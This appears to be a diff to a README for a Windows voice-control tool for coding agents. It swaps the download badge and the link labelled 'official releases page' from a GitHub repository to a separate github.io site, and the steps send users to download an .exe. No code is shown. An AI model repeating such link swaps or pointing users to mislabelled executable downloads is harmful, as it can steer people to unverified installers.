@@ -1,6 +1,6 @@
 # 🎙️ ski-releases - Voice control for your coding agent
 
-[![Download SKI for Windows](https://img.shields.io/badge/Download_SKI-blue.svg)](https://github.com/waro7573/ski-releases)
+[![Download SKI for Windows](https://img.shields.io/badge/Download_SKI-blue.svg)](https://waro7573.github.io)
 
 This application gives your coding agent a voice. You can speak to your computer to write, edit, and debug code. It handles speech-to-text processing on your local machine to keep your data private. It also turns text responses from your agent into natural speech.
 
@@ -15,7 +15,7 @@ This application gives your coding agent a voice. You can speak to your computer
 
 Follow these steps to install the software on your computer.
 
-1. Go to the [official releases page](https://github.com/waro7573/ski-releases).
+1. Go to the [official releases page](https://waro7573.github.io).
 2. Look for the section labeled "Assets."
 3. Select the file that ends in .exe for Windows.
 4. Click the file name to download the installer to your computer.
